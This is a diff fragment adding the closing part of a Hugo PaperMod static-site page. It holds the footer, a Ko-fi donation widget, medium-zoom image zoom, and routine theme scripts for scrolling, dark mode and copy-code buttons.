+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script src='https://storage.ko-fi.com/cdn/scripts/overlay-widget.js'></script>
+<script>
+    kofiWidgetOverlay.draw('imkstho', {
+        'type': 'floating-chat',
+        'floating-chat.donateButton.text': 'Feed Mee',
+        'floating-chat.donateButton.background-color': '#FF5E5B',
+        'floating-chat.donatebutton.image': 'https://media.giphy.com/media/kgKFcQk6oa1WIdHNSl/giphy.gif',
+        'floating-chat.donateButton.text-color': '#ffffff'
+    });
+</script>
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.1.0/medium-zoom.min.js" integrity="sha512-9ZKhgaFdKlsELap/dGw3Iaz5Bj+Las0XXZiRKYZaN9QArg6FtkD5rULNmNH4rTCTFxjPiBGr3MX8smRADRorDA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script>
+const images = Array.from(document.querySelectorAll(".post-content img"));
+images.forEach(img => {
+  mediumZoom(img, {
+    margin: 0,  
+    background: '#000000',
+    scrollOffset: 40,  
+    container: null,  
+    template: null  
+  });
+});
+</script>
+
+
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
